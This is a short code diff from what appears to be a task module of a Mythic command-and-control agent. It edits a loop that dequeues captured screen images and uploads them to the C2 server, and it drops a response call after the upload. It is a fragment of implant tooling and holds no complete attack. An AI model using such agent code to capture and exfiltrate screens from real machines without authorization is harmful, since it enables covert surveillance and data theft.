@@ -82,8 +82,8 @@ namespace Tasks
             };
             _putFilesAction = (object p) =>
             {
-                WaitHandle[] waiters = new WaitHandle[] { _putFilesEvent, _cancellationToken.Token.WaitHandle, _complete };
-                while (!_cancellationToken.IsCancellationRequested && !_completed)
+                WaitHandle[] waiters = new WaitHandle[] { _putFilesEvent, _cancellationToken.Token.WaitHandle };
+                while (!_cancellationToken.IsCancellationRequested )
                 {
                     WaitHandle.WaitAny(waiters);
                     if (_putFilesQueue.TryDequeue(out byte[] screen))
@@ -98,10 +98,6 @@ namespace Tasks
                                 out string mythicFileId,
                                 true))
                             {
-                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                    mythicFileId,
-                                    false,
-                                    ""));
                                 return true;
                             } else
                             {
